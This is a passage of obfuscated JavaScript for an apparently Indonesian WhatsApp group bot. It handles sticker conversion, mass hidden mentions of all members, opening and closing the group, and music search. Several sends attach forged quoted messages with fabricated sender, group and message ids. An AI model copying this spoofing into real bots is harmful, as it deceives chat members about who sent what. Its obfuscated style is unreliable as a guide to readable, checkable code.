isPoto=type===_0x593f96(0x82c,0x9f8,0x5b1,0x7bb)+'ge'||type==='videoMessa'+'ge',isVideo=type==='stickerMes'+_0x593f96(0xc5b,0xe5e,0xc86,0xed0)&&content[_0x1e23e4(0xc54,0x588,0x764,0x418)](_0x1e23e4(0x7d9,0xa13,0x9c3,0x662)+'ge'),isFoto=type===_0x1e23e4(0x44b,-0x1d,0x1c2,0x499)+_0x593f96(0xc5b,0xbb3,0x822,0xe8d)&&content['includes'](_0x593f96(0x82c,0x74b,0xb38,0x68f)+'ge');if((isPoto&&!mek[_0x1e23e4(0xe5d,0x884,0x9a7,0xb22)]['videoMessa'+'ge']||isFoto)&&args[_0x1e23e4(0x61f,0xdb4,0x90a,0xe0b)]==0x1a38+0x53e*-0x1+-0xa7d*0x2){const encmedia=isFoto?JSON['parse'](JSON[_0x593f96(0xa27,0xca7,0xd65,0xdf1)](mek)['replace'](_0x593f96(0x731,0x911,0x832,0x980),'m'))['message'][_0x593f96(0x3a0,-0x151,0x858,0x658)+_0x593f96(0xc5b,0xccc,0x7fb,0x10d0)][_0x593f96(0xaa4,0x5c3,0xbee,0xe65)+'o']:mek,media=await alpha[_0x593f96(0xc31,0xa43,0x77c,0x899)+'dSaveMedia'+_0x1e23e4(0x547,0x6b2,0x341,-0x1bb)](encmedia);ran='666.webp',await ffmpeg('./'+media)[_0x1e23e4(0xb22,0x79e,0x66b,0x47c)](media)['on'](_0x593f96(0x6fb,0x6c0,0x2e4,0x639),function(_0x10f4f6){function _0x5a6627(_0x38d74f,_0x5a43cd,_0x3744b0,_0x1e0dab){return _0x1e23e4(_0x38d74f-0xca,_0x5a43cd-0xe,_0x5a43cd-0x16,_0x3744b0);}function _0x4def1c(_0x67a566,_0x569811,_0x4f62fb,_0x23b679){return _0x1e23e4(_0x67a566-0xaa,_0x569811-0x39,_0x4f62fb- -0x127,_0x67a566);}console[_0x5a6627(0x9da,0x5a4,0x883,0x9ec)](_0x5a6627(0xa6f,0x7d4,0x920,0x3c0)+_0x10f4f6);})['on'](_0x593f96(0x755,0x62f,0x30b,0x868),function(_0x6cce6b){const _0x38e5fd={'zjBCp':function(_0x2a0fe8,_0x52b871){return _0x2a0fe8(_0x52b871);}};function _0x579e01(_0x566db5,_0x5e5ddd,_0x55396a,_0x53b4b2){return _0x593f96(_0x5e5ddd- -0x189,_0x55396a,_0x55396a-0x1be,_0x53b4b2-0x30);}console[_0x36d459(0x380,0x2b1,0x422,0x526)]('Error\x20:\x20'+_0x6cce6b),fs[_0x579e01(-0x3d,0x372,0x662,0x6d5)](media);function _0x36d459(_0x26cf39,_0x35bb50,_0x1a292a,_0x7b6cc8){return _0x593f96(_0x35bb50- -0x4bb,_0x26cf39,_0x1a292a-0xa9,_0x7b6cc8-0x1dc);}_0x38e5fd[_0x579e01(0x2fe,0x340,0x49,0x432)](reply,_0x579e01(0x85d,0x5cc,0x87c,0x842));})['on'](_0x1e23e4(0x3b6,0x14,0x276,0x520),function(){const _0x379cc9={};_0x379cc9[_0x2a6841(0x67,0x3a4,0xf1,0x1d8)]=_0x2a6841(0x1e,0x192,0x116,0x3be);const _0x56b852=_0x379cc9;console[_0x223237(0x919,0x76d,0x6a1,0x772)](_0x56b852[_0x223237(0x63f,0x815,0x839,0xbb6)]);const _0x134b32={};function _0x2a6841(_0x4554cd,_0x34416c,_0x52bb6b,_0x37b508){return _0x1e23e4(_0x4554cd-0x35,_0x34416c-0x98,_0x34416c- -0x292,_0x52bb6b);}_0x134b32[_0x223237(0xccd,0x992,0x629,0x9be)]=mek,alpha[_0x2a6841(0x64a,0x3f3,0x1d0,-0x1d)+'e'](from,fs['readFileSy'+'nc'](ran),sticker,_0x134b32);function _0x223237(_0x268705,_0x355d6d,_0x555d6f,_0x512c95){return _0x593f96(_0x355d6d-0x1,_0x512c95,_0x555d6f-0x1f0,_0x512c95-0xec);}fs[_0x2a6841(0x23,0x8b,0x4a4,0x183)](media),fs['unlinkSync'](ran);})['addOutputO'+_0x593f96(0x992,0x6ee,0x8d8,0xcbd)]([_0x1e23e4(0x5be,0x3e9,0x844,0x421),_0x593f96(0x999,0x766,0x8a6,0xe4d),_0x593f96(0x415,0x62c,0x82,0x2f7),_0x1e23e4(0x8bc,0x699,0x81b,0xc11)+'(320,iw)\x27:'+_0x1e23e4(-0xeb,0x5c4,0x333,0x1c0)+_0x593f96(0x984,0xa3c,0xa0a,0x7d8)+_0x1e23e4(0xb46,0xef0,0xa8a,0xe39)+_0x593f96(0x349,0x75,-0xba,0x453)+'o=decrease'+_0x1e23e4(0xc7a,0x81a,0xab9,0xea3)+_0x1e23e4(-0xa9,0x142,0xe3,0x1cc)+_0x593f96(0x70e,0x2b1,0x332,0x889)+_0x593f96(0xb5a,0xc17,0xb8a,0xa33)+_0x1e23e4(0x3fd,0x208,0x1c8,-0x13a)+'[a][b];\x20[a'+']\x20paletteg'+'en=reserve'+_0x593f96(0x848,0x6f6,0x5e6,0x378)+_0x1e23e4(0x63e,0x4e7,0x56b,0x549)+_0x593f96(0x795,0x53b,0x734,0xbd6)+_0x1e23e4(0x7e5,0x6df,0x6d5,0xb8b)+'f\x20[p];\x20[b]'+_0x1e23e4(0x235,0x1d5,0x241,-0x139)+_0x593f96(0x8e4,0x521,0x9d2,0x744)])[_0x1e23e4(0x1d6,0x839,0x45e,0x552)](_0x1e23e4(0x8d4,0x720,0x910,0x761))[_0x1e23e4(0x902,0x949,0x9e9,0x92b)](ran);}else{if((isPoto&&mek[_0x593f96(0xb85,0xe8e,0xe4f,0x6b6)]['videoMessa'+'ge']['seconds']<0x3d2+-0xc9*0x7+0x5*0x58||isVideo&&mek['message'][_0x1e23e4(0x69c,0x28c,0x1c2,0x57)+'sage'][_0x593f96(0xaa4,0xf7d,0xdeb,0x943)+'o']['quotedMess'+'age'][_0x593f96(0xba1,0xf06,0x686,0xc8e)+'ge'][_0x1e23e4(0xa7c,0x969,0xabf,0xd79)]<0x2537+0x2*-0x123a+-0xb8)&&args[_0x593f96(0xae8,0xa8e,0x723,0xcb1)]==-0x2552+0x161a+0x4*0x3ce){const encmedia=isVideo?JSON[_0x1e23e4(0x207,0x7d1,0x5e7,0x156)](JSON['stringify'](mek)[_0x593f96(0x41e,0x52a,0x5a9,0x7ed)](_0x1e23e4(0x667,0x8b0,0x553,0x796),'m'))['message'][_0x593f96(0x3a0,0x1e6,0x8ae,0x3ba)+_0x1e23e4(0xc46,0xdd3,0xa7d,0xec0)][_0x593f96(0xaa4,0xc81,0xb77,0xe0c)+'o']:mek,media=await alpha[_0x1e23e4(0x631,0x6e3,0xa53,0x8f0)+_0x593f96(0x892,0xa90,0x885,0x3c2)+_0x593f96(0x51f,0xbf,0x2d,0x6ea)](encmedia);ran=_0x1e23e4(0x4e7,0x5fa,0x1b3,-0x135),reply(lang[_0x1e23e4(-0x264,0xd,0x143,0x2ca)]()),await ffmpeg('./'+media)[_0x1e23e4(0x40c,0x5e7,0x228,0xea)+'t'](media[_0x593f96(0x311,0x220,0x6e0,-0x1b2)]('.')[0x1cab+0x3*0x1ff+0xb8d*-0x3])['on'](_0x593f96(0x6fb,0x3c6,0x62c,0x70c),function(_0x528bf5){function _0x5e9f7b(_0x3d539a,_0xc119b,_0x27ce20,_0x37c47f){return _0x1e23e4(_0x3d539a-0xd,_0xc119b-0xf3,_0xc119b-0xb1,_0x27ce20);}function _0x2b94f2(_0x16a5ca,_0xa9e70d,_0x4bb79f,_0x9180f7){return _0x1e23e4(_0x16a5ca-0xb8,_0xa9e70d-0x10b,_0xa9e70d- -0x165,_0x9180f7);}console[_0x5e9f7b(0xaf6,0x63f,0x451,0x42e)](_0x2b94f2(0x1f8,0x659,0x9cc,0x214)+_0x528bf5);})['on']('error',function(_0x4f6261){function _0x38077a(_0x30aadc,_0x2b6d0a,_0x512aa4,_0x212e11){return _0x593f96(_0x512aa4- -0x62,_0x212e11,_0x512aa4-0x2,_0x212e11-0x1a6);}const _0x497f1d={};_0x497f1d[_0x38077a(0xdf4,0xe1e,0x985,0x6b6)]='.mp4',_0x497f1d[_0x38077a(0xe5d,0xf00,0xb20,0x8db)]=_0xdbc489(0x558,0x7e7,0x96d,0x522),_0x497f1d['JcBuy']=_0x38077a(0x360,0xad2,0x844,0x430);function _0xdbc489(_0x88049a,_0x5ba653,_0x598332,_0x4af86b){return _0x593f96(_0x4af86b- -0xe3,_0x5ba653,_0x598332-0x58,_0x4af86b-0x12a);}const _0x338e2f=_0x497f1d;console[_0x38077a(0x6b2,0xa19,0x70a,0x38e)]('Error\x20:\x20'+_0x4f6261),fs['unlinkSync'](media),tipe=media[_0x38077a(0x595,-0xbe,0x3a9,0x780)](_0x338e2f[_0x38077a(0x791,0xd18,0x985,0x78e)])?_0x338e2f['TxSNw']:_0x338e2f[_0x38077a(0x5,0x44b,0x46f,0x73d)],reply('Gagal,\x20pad'+_0xdbc489(0x422,-0x17f,-0xef,0x1c8)+_0xdbc489(-0xce,0x46d,0x4e6,0x445)+tipe+_0xdbc489(0xbd6,0x7b8,0x5fe,0x7bc));})['on'](_0x1e23e4(0x74,-0xcf,0x276,-0xfe),function(){console['log']('Finish');function _0x3e812e(_0x3792d6,_0x4565c7,_0x2742c5,_0x3251bb){return _0x1e23e4(_0x3792d6-0x24,_0x4565c7-0xa7,_0x2742c5- -0x6d,_0x3251bb);}function _0x1dd659(_0x23680f,_0x5e90d4,_0x3df149,_0x43dd98){return _0x593f96(_0x43dd98- -0x454,_0x5e90d4,_0x3df149-0x64,_0x43dd98-0x13b);}const _0x52e825={};_0x52e825['quoted']=mek,alpha['sendMessag'+'e'](from,fs[_0x3e812e(0x6a0,0x257,0x514,0x9)+'nc'](ran),sticker,_0x52e825),fs[_0x1dd659(-0xb8,0x3e7,-0x42c,0xa7)](media),fs['unlinkSync'](ran);})['addOutputO'+_0x1e23e4(0x3da,0xa92,0x7b4,0xa85)]([_0x1e23e4(0xd22,0x462,0x844,0x3cc),_0x593f96(0x999,0xb62,0x5d7,0xe55),_0x1e23e4(-0x1a2,0x1f0,0x237,0x245),'scale=\x27min'+'(320,iw)\x27:'+_0x1e23e4(-0xeb,0x809,0x333,0x13d)+_0x1e23e4(0x9fb,0x353,0x7a6,0x52a)+_0x1e23e4(0x657,0x766,0xa8a,0x6f5)+_0x1e23e4(0x16b,0x1e8,0x16b,0x597)+_0x1e23e4(0x320,0xbbf,0x736,0x478)+',fps=15,\x20p'+_0x1e23e4(-0x63,0x8b,0xe3,-0x107)+_0x593f96(0x70e,0x924,0x593,0x9cd)+_0x1e23e4(0xb05,0xdc1,0x97c,0x52d)+_0x593f96(0x3a6,0x724,0x3c2,0x288)+_0x593f96(0xc3d,0xefb,0x9e8,0xdc3)+']\x20paletteg'+_0x593f96(0x424,0x4e2,0x773,0x6c8)+_0x593f96(0x848,0xbea,0x635,0xb20)+_0x593f96(0x749,0x437,0xa44,0x269)+_0x593f96(0x795,0xca7,0x728,0x5ac)+_0x593f96(0x8b3,0x55f,0xd47,0x548)+_0x593f96(0x4f8,0x316,0x2b7,0x15c)+_0x1e23e4(0x11,0x59c,0x241,0x208)+'euse'])[_0x593f96(0x63c,0xafb,0x80c,0x8a4)](_0x593f96(0xaee,0x75e,0xad7,0x828))['save'](ran);}else fakegroup(_0x593f96(0x357,-0x15a,0x37d,-0x4f)+_0x593f96(0x51e,0x9be,0x318,0x149)+'caption\x20'+prefix+'sticker'+enter+(_0x593f96(0x30a,0x500,0x6c9,0x2c1)+_0x1e23e4(0x40d,0x51a,0x71b,0x5ba)+'\x201-9\x20Detik'));}}}if(stc){if(stc[_0x593f96(0xa7a,0xf12,0x6c2,0x7aa)]==''+cmd_stc_to_image){console[_0x1e23e4(0x95,0x540,0x58e,0x8d2)](color(time,_0x593f96(0x359,0x189,0x65c,-0x181)),color(moment['tz'](_0x593f96(0xbf1,0xce1,0xcc2,0xa3a)+'ta')['format'](_0x1e23e4(0x875,0xe09,0x92c,0x532)),_0x593f96(0x7b3,0xb4b,0x4dd,0x5ef)),color('STC\x20CMD\x20ST'+'ICKER\x20TO\x20I'+_0x593f96(0x452,0x6c5,0x69a,0x66c)));const isStikerl=type==='stickerMes'+_0x1e23e4(0xa12,0x660,0xa7d,0xa16)&&content[_0x1e23e4(0x668,0x2ca,0x764,0x69a)](_0x1e23e4(0x1fb,-0x5d,0x1c2,-0xbe)+_0x593f96(0xc5b,0xf14,0xb57,0xf5e));if(!isStikerl)return fakeitem(_0x593f96(0x9db,0x70c,0xb1f,0xe74)+_0x593f96(0xb52,0xd44,0x6e4,0xe8f)+_0x1e23e4(0x7e,0x24c,0xf7,0x550)+'!');reply(lang['wait']()),encmedia=JSON['parse'](JSON['stringify'](mek)[_0x1e23e4(0x5f1,0x527,0x240,0x709)](_0x593f96(0x731,0x891,0xb2b,0x9d1),'m'))['message'][_0x1e23e4(-0x1d5,0x5b3,0x1c2,0x6d4)+'sage']['contextInf'+'o'],media=await alpha[_0x593f96(0xc31,0xaac,0xd26,0x986)+_0x1e23e4(0xaa5,0xae1,0x6b4,0x5a1)+'Message'](encmedia),ran=getRandom('.png'),exec('ffmpeg\x20-i\x20'+media+'\x20'+ran,_0x354ad7=>{const _0x19df92={'BdTXb':function(_0x241c2d,_0x25c5d8){return _0x241c2d(_0x25c5d8);},'eopir':_0x3f50a3(0x69d,0x7aa,0x317,0x75b)+_0x1d613d(0x4e0,0x876,0xa6,0x818)+_0x3f50a3(0x330,0x191,0x92e,0x539),'SuITq':function(_0x34e89f,_0x508342,_0x3810d5){return _0x34e89f(_0x508342,_0x3810d5);},'nkAIn':'Support\x20ZE'+_0x3f50a3(0x4e9,-0x7,0x272,0x485)};fs[_0x3f50a3(0xb4,0x35a,0x4dd,0xf)](media);if(_0x354ad7)return _0x19df92[_0x1d613d(0x82c,0x8ef,0x3df,0xb2a)](reply,_0x19df92[_0x3f50a3(-0x1b9,0xab,0x45e,0x21)]);function _0x1d613d(_0x4e863e,_0x340f7d,_0x266041,_0x2fc031){return _0x593f96(_0x4e863e- -0x46a,_0x340f7d,_0x266041-0x1e2,_0x2fc031-0x17b);}function _0x3f50a3(_0x476905,_0x2d3a7d,_0x4d6ae7,_0x239d5c){return _0x1e23e4(_0x476905-0x1da,_0x2d3a7d-0x62,_0x239d5c- -0x30e,_0x476905);}buffer=fs['readFileSy'+'nc'](ran),_0x19df92[_0x3f50a3(0xcac,0x8c0,0x777,0x7cd)](fakethumb,buffer,_0x19df92[_0x1d613d(0x240,0x5cc,0x4c7,-0x133)]),fs['unlinkSync'](ran);});}}if(stc){if(stc['fileLength']==0x3055+-0x2dc2+0x1aed){var value=_0x1e23e4(0x32c,0x616,0x3da,-0xf5)+_0x593f96(0x2fe,0x152,0x21b,0x23e)+'\x20'+enter+enter+'\x20';value+=enter+(_0x1e23e4(0x516,0x72a,0x763,0xb3c)+_0x593f96(0xaa8,0xe09,0x8a4,0xd80)+_0x593f96(0x2b0,0x237,-0x10e,0x534)+_0x1e23e4(0x2f7,0x8a8,0x4ee,0x9c7)+'wbApjkyODb'+_0x1e23e4(0x5a5,0x5b7,0x1c4,0x533))+enter+enter,value+=enter+(_0x1e23e4(0x42d,0x860,0x6ad,0xb9e)+_0x593f96(0x37f,0x4cd,0x3b2,0x1b2))+enter+enter,value+=enter+_0x593f96(0x4b7,0x8f7,0x9a,0x2b6);var group=await alpha['groupMetad'+_0x593f96(0x2f9,0x730,0xe6,0x4)](from),member=group['participan'+'ts'],mem=[];member[_0x593f96(0x323,0x592,-0x149,0x1dd)](async _0x40c51b=>{const _0x5d1aff={};_0x5d1aff[_0x2d6de3(0xadd,0x974,0x82b,0xc4f)]='c.us';function _0x3f5583(_0x2cb679,_0x204856,_0x9b87e6,_0x440340){return _0x593f96(_0x9b87e6-0x37,_0x440340,_0x9b87e6-0x13b,_0x440340-0xe4);}_0x5d1aff['OYbDH']=_0x2d6de3(0xe26,0x931,0xca7,0xc7a)+'.net';const _0x449c5a=_0x5d1aff;function _0x2d6de3(_0x3cfc25,_0x196aa9,_0x1d35c6,_0x586279){return _0x1e23e4(_0x3cfc25-0xde,_0x196aa9-0x15d,_0x586279-0x244,_0x3cfc25);}mem[_0x2d6de3(0xc50,0x785,0x356,0x7a3)](_0x40c51b['id'][_0x3f5583(0x189,0x58,0x455,0x3c4)](_0x449c5a[_0x2d6de3(0x10a5,0x1072,0xbc4,0xc4f)],_0x449c5a[_0x3f5583(0x59d,0x1da,0x527,0xe4)]));});const _0x30b668={};_0x30b668[_0x1e23e4(0x4d1,-0x2dc,0xcf,-0x419)+'id']=mem;const _0x3107ef={};_0x3107ef[_0x593f96(0xc48,0xe7b,0xa59,0xe0a)]=value,_0x3107ef[_0x593f96(0xaa4,0xef9,0xce8,0xd02)+'o']=_0x30b668,_0x3107ef['quoted']=mek;var optionshidetag=_0x3107ef;const _0x14ce4e={};_0x14ce4e['participan'+'t']=_0x1e23e4(0x1a6,0x5c0,0x641,0x33c)+_0x593f96(0x5cb,0x694,0xc2,0xa28),_0x14ce4e['remoteJid']='6283136505'+_0x1e23e4(-0x7e,0x61a,0x3c1,0x892)+'3337@g.us',_0x14ce4e[_0x1e23e4(0xb7e,0x452,0x8e6,0xdbe)]=![],_0x14ce4e['id']='B391837A58'+'338BA8186C'+_0x1e23e4(0x9b2,0xb93,0x7b6,0x8a6)+'4A';const _0x2c1be2={};_0x2c1be2[_0x593f96(0xa0e,0x895,0x959,0xe97)+_0x1e23e4(0x1bd,0x56a,0x608,0x6b2)]=0x3e7,_0x2c1be2['isForwarde'+'d']=!![],alpha[_0x1e23e4(0x634,0x312,0x685,0x476)+'e'](from,optionshidetag,text,{'quoted':{'key':_0x14ce4e,'message':{'documentMessage':{'jpegThumbnail':fs['readFileSy'+'nc'](_0x1e23e4(0xa5c,0xbc9,0xab6,0xda4)+thumbnail),'mimetype':_0x593f96(0x351,-0x30,0x480,0x5bd)+'n/octet-st'+'ream','title':''+setting['fake'],'fileLength':'36','pageCount':0x0,'fileName':setting[_0x1e23e4(0x23f,0x48e,0x680,0x325)]+'\x20'}},'messageTimestamp':_0x593f96(0x811,0x38e,0x860,0xce8),'status':_0x1e23e4(0xd64,0x9e8,0x919,0x483)},'contextInfo':_0x2c1be2});}}if(stc){if(stc['fileLength']==0x78a1+0x10101+-0xf808){var value=_0x1e23e4(0x7c2,0x2c1,0x73b,0x6d2)+_0x593f96(0xaf6,0xdcb,0x8e6,0xdbb)+'*'+enter+enter;value+=_0x593f96(0x941,0x9da,0x794,0x69d)+_0x593f96(0xaa8,0xecc,0x7bb,0x9a2)+_0x593f96(0x713,0x3ea,0x529,0x9db)+_0x1e23e4(0x1b8,0x6d8,0x541,0x6af)+enter+enter,value+=_0x593f96(0x8e2,0x7af,0xd18,0xaae)+_0x1e23e4(0xdc2,0xa5e,0x924,0xbdc)+enter,value+='\x0a';var group=await alpha['groupMetad'+_0x593f96(0x2f9,0x5c2,0x5a5,0x3)](from),member=group[_0x593f96(0xa0b,0xb1b,0x914,0xc55)+'ts'],mem=[];member[_0x1e23e4(-0x8a,0x6a,0x145,0x14f)](async _0x133a44=>{const _0x36dae6={};_0x36dae6[_0x5001ca(0x3f6,0x8c1,0x85b,0x97d)]=_0x5001ca(0xaf1,0x1030,0xc21,0xf6f),_0x36dae6[_0x3211e4(0x95e,0x453,0x524,0x5fc)]=_0x3211e4(0xeb8,0x9a3,0xca0,0xb25)+_0x5001ca(0x94b,0xa5a,0x83c,0x7d4);function _0x3211e4(_0x3182cd,_0x41c68a,_0x1b8a49,_0x5d26f8){return _0x1e23e4(_0x3182cd-0xce,_0x41c68a-0x103,_0x1b8a49-0x26a,_0x3182cd);}const _0x2a382b=_0x36dae6;function _0x5001ca(_0x2b6336,_0x37d6e4,_0x11a4fd,_0x2e38b4){return _0x593f96(_0x11a4fd-0x177,_0x2b6336,_0x11a4fd-0xc1,_0x2e38b4-0x19c);}mem[_0x5001ca(0x3df,0x9c0,0x8b4,0x48a)](_0x133a44['id'][_0x3211e4(0x174,0x63c,0x4aa,0x8e3)](_0x2a382b[_0x5001ca(0x59a,0x996,0x85b,0x96d)],_0x2a382b[_0x5001ca(0x755,0x3fe,0x60f,0x3d9)]));});const _0x192aea={};_0x192aea[_0x593f96(0x2ad,0x20c,0x538,-0x256)+'id']=mem;const _0x274aa2={};_0x274aa2[_0x593f96(0xc48,0xc80,0x104f,0x10a8)]=value,_0x274aa2[_0x1e23e4(0x91a,0x9c0,0x8c6,0x9f4)+'o']=_0x192aea,_0x274aa2[_0x1e23e4(0xb64,0x791,0x7b3,0x95f)]=mek;var optionshidetag=_0x274aa2;const _0x77a6f4={};_0x77a6f4['participan'+'t']=_0x1e23e4(0x5c9,0x8f4,0x641,0x8a1)+'pp.net',_0x77a6f4[_0x593f96(0x305,0x24b,0x523,0x7e7)]=_0x1e23e4(0xe56,0x727,0xa6b,0x666)+_0x593f96(0x59f,0x891,0xb3,0x5c4)+_0x593f96(0x8ae,0xcb3,0x3b6,0xa62),_0x77a6f4['fromMe']=![],_0x77a6f4['id']='B391837A58'+_0x1e23e4(-0x35,-0x2d5,0x10a,0x39e)+_0x593f96(0x994,0xc81,0x7c9,0xd9b)+'4A';const _0x4ce4e5={};_0x4ce4e5[_0x593f96(0xa0e,0xe3f,0x899,0xa06)+_0x593f96(0x7e6,0xb2d,0x962,0x8be)]=0x3e7,_0x4ce4e5[_0x1e23e4(0x982,0x596,0xaaf,0x84f)+'d']=!![],alpha[_0x1e23e4(0x761,0xacd,0x685,0x9d6)+'e'](from,optionshidetag,text,{'quoted':{'key':_0x77a6f4,'message':{'documentMessage':{'jpegThumbnail':fs['readFileSy'+'nc'](_0x1e23e4(0xd5f,0x94e,0xab6,0xed5)+thumbnail),'mimetype':_0x1e23e4(-0x376,0x10f,0x173,0x47f)+'n/octet-st'+'ream','title':''+setting['fake'],'fileLength':'36','pageCount':0x0,'fileName':setting[_0x593f96(0x85e,0x906,0x7d9,0x54e)]+'\x20'}},'messageTimestamp':_0x1e23e4(0x312,0x265,0x633,0x5ef),'status':_0x593f96(0xaf7,0xd4f,0x6cc,0xd96)},'contextInfo':_0x4ce4e5});}}if(stc){if(stc[_0x593f96(0xa7a,0xb1c,0xe18,0x69a)]==''+cmd_stc_group_open){console['log'](color(time,'magenta'),color(moment['tz'](_0x593f96(0xbf1,0xeb1,0x814,0x7b3)+'ta')[_0x593f96(0xb27,0xa65,0xeec,0xde8)]('HH:mm:ss'),_0x593f96(0x7b3,0xb1d,0xc51,0x2eb)),color('STC\x20CMD\x20GR'+_0x593f96(0x6de,0x9df,0xa2e,0xb66)));if(!isBotGroupAdmins)return reply(_0x593f96(0x3e1,0x34c,0x525,0x705)+_0x1e23e4(0xa5f,0x1fc,0x5ec,0x42c)+_0x593f96(0x847,0xc01,0x8cb,0xcd6)+'erlebih\x20da'+_0x1e23e4(0xcd0,0x725,0x916,0x64b));await alpha[_0x593f96(0x92d,0x58e,0x82e,0xba5)+'ngChange'](from,GroupSettingChange[_0x1e23e4(0x11,-0x14c,0x358,0x2ce)+'d'],![]),fakegroup(_0x1e23e4(0x72c,0x959,0x600,0x78f)+'FULLY\x20OPEN'+'ING\x20GROUP`'+'``');}else stc[_0x593f96(0xa7a,0x593,0x6da,0x914)]==''+cmd_stc_group_close&&(console['log'](color(time,_0x1e23e4(0x1a5,0x376,0x17b,0x10b)),color(moment['tz'](_0x1e23e4(0x675,0x65a,0xa13,0xce4)+'ta')[_0x1e23e4(0xd90,0x490,0x949,0x511)](_0x593f96(0xb0a,0xb6c,0xbd1,0x7b1)),'gold'),color(_0x593f96(0x3b7,0x7d0,0x1d1,0x7df)+_0x593f96(0xa4d,0xe4b,0xa43,0x76c))),await alpha[_0x593f96(0x92d,0x6e4,0x85c,0x467)+_0x1e23e4(0xaf8,0x7a0,0xa25,0xc05)](from,GroupSettingChange['messageSen'+'d'],!![]),fakegroup(_0x1e23e4(0x6ab,0x590,0x600,0x23a)+_0x593f96(0x7ac,0x575,0x2ae,0x381)+_0x593f96(0x3ca,0x149,-0x2a,0x4fa)));}if(stc){if(stc[_0x593f96(0xa7a,0xc74,0x916,0x610)]==''+cmd_stc_play_music){console[_0x593f96(0x76c,0x863,0x2e0,0x47d)](color(time,_0x593f96(0x359,0x518,0x73b,0x7a7)),color(moment['tz'](_0x1e23e4(0x65a,0xd4f,0xa13,0x918)+'ta')['format'](_0x593f96(0xb0a,0x643,0xd08,0xecd)),_0x593f96(0x7b3,0x34e,0xaa6,0x563)),color(_0x593f96(0x813,0xd1a,0xbb6,0x893)+_0x1e23e4(0x6b9,0x386,0x7a1,0x675))),fakegroup(_0x593f96(0x6b2,0x2b6,0x1a5,0xb32)+'ng\x20Song...'+_0x1e23e4(0xd68,0xa82,0xad6,0x9af)),aramas=await yts(srchh),aramat=aramas[_0x593f96(0x68e,0x665,0x6f4,0x74b)];var mulaikah=aramat[0xc03+-0x98+0xb6b*-0x1]['url'];try{yta(mulaikah)[_0x593f96(0x845,0xa43,0x9e6,0x6c4)](_0x2d05f4=>{function _0x48f2dc(_0x4a73ae,_0x56b33c,_0x505ac4,_0x243561){return _0x1e23e4(_0x4a73ae-0x79,_0x56b33c-0x2a,_0x4a73ae-0x3c4,_0x243561);}const _0xbfc2bf={'kjSlW':function(_0x32ea3b,_0x3e7c8e){return _0x32ea3b==_0x3e7c8e;},'hTcaZ':function(_0x469069,_0x5eaf5d){return _0x469069*_0x5eaf5d;},'xvbCx':function(_0x455337,_0x32e0b5){return _0x455337!==_0x32e0b5;},'zVjAJ':_0x48f2dc(0x900,0xb23,0x4ac,0xdce),'HRLLS':function(_0x49eadc,_0x23ff02){return _0x49eadc>=_0x23ff02;},'CiMGn':function(_0x3e2803,_0x99d91f,_0x3d526b,_0xb81247){return _0x3e2803(_0x99d91f,_0x3d526b,_0xb81247);},'UzXfK':function(_0x26b454,_0x316bf6,_0x1829c2){return _0x26b454(_0x316bf6,_0x1829c2);}};function _0x8f1907(_0xdf454d,_0x14c557,_0x13dde0,_0xa0a036){return _0x593f96(_0x14c557-0x16a,_0xa0a036,_0x13dde0-0x92,_0xa0a036-0x18b);}const {dl_link:_0x41fa99,thumb:_0x7fc1a2,title:_0x4dc9ca,filesizeF:_0x56ed2e,filesize:_0x42f805}=_0x2d05f4;axios['get'](_0x8f1907(0x2fd,0x671,0x755,0x389)+'nyurl.com/'+_0x48f2dc(0xb11,0xa3d,0xad7,0xbb3)+_0x48f2dc(0xd2a,0xc9a,0xd96,0xcb8)+_0x41fa99)[_0x48f2dc(0xa2b,0x611,0x712,0xada)](async _0x2c3fb6=>{const _0x246f20={'cXJuv':function(_0x3fbedc,_0x1d19ff){function _0x42b2e1(_0x3b1c39,_0x43badc,_0x1dcd21,_0x143ca0){return _0x1511(_0x43badc- -0x25f,_0x143ca0);}return _0xbfc2bf[_0x42b2e1(0x842,0x7be,0x4d7,0x9b1)](_0x3fbedc,_0x1d19ff);},'JehxM':_0x1ec679(0x7da,0x4c5,0xc5d,0x5f0),'tChLo':function(_0x4bc2e4,_0x3fc443){function _0x1e2b6b(_0x5e3350,_0x35a651,_0x4b7add,_0xdb601e){return _0x1ec679(_0x5e3350-0x104,_0x35a651-0xdf,_0x4b7add-0xf2,_0x4b7add);}return _0xbfc2bf[_0x1e2b6b(0x47a,0x21b,0x379,0x2f1)](_0x4bc2e4,_0x3fc443);}};function _0x1ec679(_0x368f25,_0x5416b4,_0x43f14e,_0x4ffaa5){return _0x48f2dc(_0x368f25- -0x6e3,_0x5416b4-0x1c2,_0x43f14e-0xd6,_0x4ffaa5);}function _0x26197c(_0x4630b5,_0x2364d1,_0x2b4c4b,_0x3e7245){return _0x8f1907(_0x4630b5-0xdc,_0x2364d1- -0x57d,_0x2b4c4b-0x99,_0x2b4c4b);}if(_0xbfc2bf['xvbCx'](_0xbfc2bf[_0x26197c(0x49b,0x800,0x5d3,0x91c)],_0xbfc2bf['zVjAJ'])){_0x3bee05=_0x246f20[_0x26197c(0x35d,-0x56,-0x318,-0x236)](typeof _0x2b717f,_0x246f20[_0x26197c(0x40e,0x264,0x77d,0x3ab)])?![]:!![];let _0x2995c7=new _0x5c0489(_0x22237b);_0x4b025f&&(_0x2995c7=new _0x48530b(_0x246f20[_0x1ec679(0x5fc,0x9f6,0x3c6,0x35c)](_0x2f32dc,-0x40*0x10+-0x1a85+-0x1*-0x226d)));var _0x1f99ff=_0x2995c7[_0x1ec679(0x46f,-0x31,0x560,0x423)](),_0x1bc3d6=_0x2995c7[_0x1ec679(-0x56,0x2d2,-0x6f,-0x2e4)](),_0x8dab8b=_0x2995c7[_0x26197c(0xb52,0x894,0x7f6,0x89f)](),_0x54d6c4=_0x1f99ff+':'+_0x1bc3d6+':'+_0x8dab8b;return _0x54d6c4;}else{if(_0xbfc2bf[_0x1ec679(0x3fb,0x2ca,0x3f,0x80d)](Number(_0x42f805),0x2bd0+-0x20158*0x1+0x35c28))return sendMediaURL(from,_0x7fc1a2,'*PLAY\x20MUSI'+'C*'+enter+enter+_0x26197c(0x476,0x20a,-0x268,-0x61)+_0x4dc9ca+enter+('*Ext*\x20:\x20MP'+'3')+enter+(_0x26197c(0x3cc,0xae,0x564,-0x441)+_0x26197c(0x4d7,0x3dd,0x464,0x596))+_0x56ed2e+enter+'*Link*\x20:\x20'+_0x2c3fb6['data']+enter+enter+(_0x26197c(0xf1,0x1ce,0x3d,0x4a8)+_0x26197c(-0x5e5,-0xe0,0x16e,0x8d)+'dari\x20batas'+_0x1ec679(0x5bb,0x22c,0x624,0x1cb)+_0x1ec679(0x68c,0x8ef,0x730,0x3b3)+_0x26197c(0x59c,0x797,0xaa0,0x6b8)));const 